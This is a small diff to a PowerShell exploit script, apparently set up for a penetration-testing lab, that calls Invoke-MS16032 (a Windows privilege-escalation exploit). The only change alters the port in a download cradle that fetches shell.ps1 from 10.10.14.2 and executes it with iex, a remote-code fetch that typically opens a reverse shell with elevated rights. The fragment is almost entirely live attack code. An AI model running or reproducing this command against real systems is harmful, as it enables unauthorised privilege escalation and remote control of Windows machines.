@@ -369,4 +369,4 @@ function Invoke-MS16032 {
     }
 }
 
-Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.2:9000/shell.ps1')"
+Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.2:8000/shell.ps1')"
